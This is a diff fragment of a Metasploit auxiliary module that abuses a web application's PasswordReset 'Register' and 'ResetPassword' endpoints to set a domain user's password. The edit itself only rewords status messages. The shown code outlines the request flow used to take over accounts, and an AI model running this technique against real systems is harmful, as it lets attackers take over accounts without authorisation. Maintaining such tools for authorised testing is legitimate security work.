@@ -115,7 +115,7 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     full_user = "#{domain}\\#{localuser}"
-    vprint_status("#{peer}: sending password reset request for #{full_user}")
+    vprint_status("#{peer}: registering #{full_user}")
     answers = [ Rex::Text.rand_text_alpha(8), Rex::Text.rand_text_alpha(8) ]
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
@@ -137,12 +137,12 @@ class Metasploit4 < Msf::Auxiliary
     )
 
     if !res || res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
-      print_error("#{peer}: Could not reset password for #{full_user}")
+      print_error("#{peer}: Could not register #{full_user}")
       return
     end
 
+    vprint_status("#{peer}: changing password for #{full_user}")
     password = Rex::Text.rand_text_alpha(10) + "!1"
-
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
       'method' => 'POST',
